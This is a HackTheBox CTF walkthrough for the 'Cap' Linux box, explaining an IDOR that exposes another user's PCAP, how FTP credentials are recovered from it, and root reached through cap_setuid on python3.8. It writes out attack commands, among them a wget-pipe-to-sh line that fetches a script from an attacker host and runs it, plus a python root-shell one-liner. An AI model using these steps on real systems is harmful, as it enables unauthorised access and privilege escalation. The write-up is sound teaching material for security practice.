---
title: "HackTheBox — Cap (Linux / Easy)"
date: 2024-06-05 11:00:00 +0530
categories: [CTF, HackTheBox]
tags: [linux, idor, pcap, ftp, wireshark, linux-capabilities, cap-setuid, privilege-escalation, python]
author: Prince_kumar
math: false
mermaid: false
---

> **You don't always need a zero-day. Sometimes, all it takes is a single digit change in a URL.**  
> This is the story of Cap — a Linux box that taught me the power of IDOR, a poorly secured PCAP, and a Python binary that forgot it wasn't root.

---

## Challenge Info

| Field        | Value                        |
|--------------|------------------------------|
| Platform     | HackTheBox                   |
| Box Name     | Cap                          |
| OS           | Linux                        |
| Difficulty   | Easy                         |
| Techniques   | IDOR, PCAP Analysis, Linux Capabilities (`cap_setuid`) |
| Tools Used   | nmap, Wireshark, linpeas, ftp, ssh, python3 |

---

## 🕚 11:00 — Reconnaissance

Cap's IP is `<TARGET_IP>`. First, I knock on every door with a fast port scan:

```bash
nmap -p- --min-rate 10000 <TARGET_IP>
```

Three answers come back: **21 (FTP)**, **22 (SSH)**, **80 (HTTP)**. The service scan reveals:

- `vsftpd 3.0.3` on FTP
- `OpenSSH 8.2p1` on SSH
- `Gunicorn` serving a web dashboard on port 80

I add `cap.htb` to `/etc/hosts` for convenience:

```bash
echo "<TARGET_IP> cap.htb" | sudo tee -a /etc/hosts
```

Opening `http://cap.htb` in the browser shows a page calling itself **"Security Dashboard"** — it tracks failed logins, port scans, and captures network snapshots. Interesting attack surface.

---

## 🕦 11:30 — Dead Ends and Anonymous Hopes

I try the obvious path first — FTP anonymous login:

```bash
ftp <TARGET_IP>
# Name: anonymous
# Password: anonymous
# → 530 Login incorrect.
```

SSH anonymous? No luck either:

```bash
ssh anonymous@<TARGET_IP>
# → Permission denied.
```

The web app seems designed for a user named **Nathan**. Clicking around I find a "Security Snapshots" section. Each snapshot has a numeric ID in the URL:

```
http://cap.htb/download/2
```

The number `2` feels suspiciously… changeable.

---

## 🕛 12:00 — The IDOR Discovery

I change `2` to `0`:

```
http://cap.htb/download/0
```

The dashboard reloads with a **different user's snapshot**. Classic **Insecure Direct Object Reference (IDOR)** — the server never validated whether I owned snapshot `0`. I download the `.pcap` file and crack it open in Wireshark.

The capture contains raw network traffic. Buried inside a cleartext protocol stream, I spot something beautiful:

```
USER nathan
PASS <NATHAN_PASSWORD>
```

**Credentials. In plaintext. From another user's snapshot. Thank you, IDOR.**

> For faster analysis, tools like Zeek can automate credential extraction from PCAPs — but Wireshark did the job perfectly here.

---

## 🕐 13:00 — User Flag

I take Nathan's password and knock on FTP again:

```bash
ftp cap.htb
# Name: nathan
# Password: <NATHAN_PASSWORD>
# → 230 Login successful.
```

A quick `dir` reveals `user.txt` sitting right there:

```bash
ftp> dir
# -r--------    1 1001     1001     33 ... user.txt
ftp> get user.txt
```

**First flag captured. 🎉**

I then SSH in with the same credentials:

```bash
ssh nathan@cap.htb
# Password: <NATHAN_PASSWORD>
# → Welcome, nathan!
```

I'm in. Time to find the path to root.

---

## 🕑 14:00 — Hunting for Privilege Escalation

I serve `linpeas.sh` from my attacker machine and pipe it directly into execution on the target:

```bash
# On attacker machine:
python3 -m http.server 8000

# On target machine:
wget http://<ATTACKER_IP>:8000/linpeas.sh -O - | sh
```

Among the noise, **one line sparkles**:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

**Linux capabilities** are like surgical superpowers for binaries — they grant specific root-like privileges without full SUID. `cap_setuid` allows a binary to **change its own user ID**. Python 3.8 has it. That means Python can become root on demand.

---

## 🕝 14:30 — Becoming Root

I confirm the capability is really there:

```bash
getcap -r / 2>/dev/null | grep cap_setuid
# → /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Now I use a one-liner to spawn a root shell:

```bash
/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` flag tells the shell to **preserve the effective UID** (which is now root) when starting. The prompt changes instantly:

```
root@cap:~#
```

I grab the root flag from `/root/root.txt` and exhale. **Rooted. 🏆**

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| IDOR | `/download/<id>` endpoint | Access other users' PCAP files |
| Cleartext credentials in PCAP | FTP traffic | Full user credential exposure |
| `cap_setuid` on Python3.8 | `/usr/bin/python3.8` | Full privilege escalation to root |

---

## Key Takeaways

**Cap is a perfect beginner box.** It teaches a clean chain of real-world concepts:

1. **Basic reconnaissance** — `nmap` to discover services quickly.
2. **IDOR** — Never trust client-supplied IDs without authorization checks. Changing `2` to `0` should never reveal someone else's data.
3. **PCAP credential harvesting** — Cleartext protocols like FTP expose passwords to anyone who can sniff or access the capture.
4. **Linux capabilities abuse** — `cap_setuid` on an interpreter like Python is essentially a root shell waiting to happen.

> *Sometimes the simplest bugs lead to complete compromise. Change a number. Download a file. Become root.*

---

*No zero-days were harmed in the making of this walkthrough. Just a curious mind, a misconfigured web app, and a Python binary that thought it was still allowed to switch to root.*